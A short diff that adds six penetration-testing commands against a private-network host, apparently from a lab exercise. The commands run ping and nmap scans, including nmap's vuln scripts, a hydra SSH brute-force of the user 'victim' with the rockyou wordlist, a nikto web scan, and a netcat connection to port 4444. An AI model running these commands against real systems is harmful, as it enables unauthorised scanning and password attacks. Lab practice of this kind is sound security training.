@@ -1,0 +1,6 @@
+ping 192.168.249.128
+nmap -sV 192.168.249.128
+nmap --script=vuln 192.168.249.128
+hydra -l victim -P /usr/share/wordlists/rockyou.txt ssh://192.168.249.128
+nikto -h https://192.168.249.128
+nc 192.168.249.128 4444
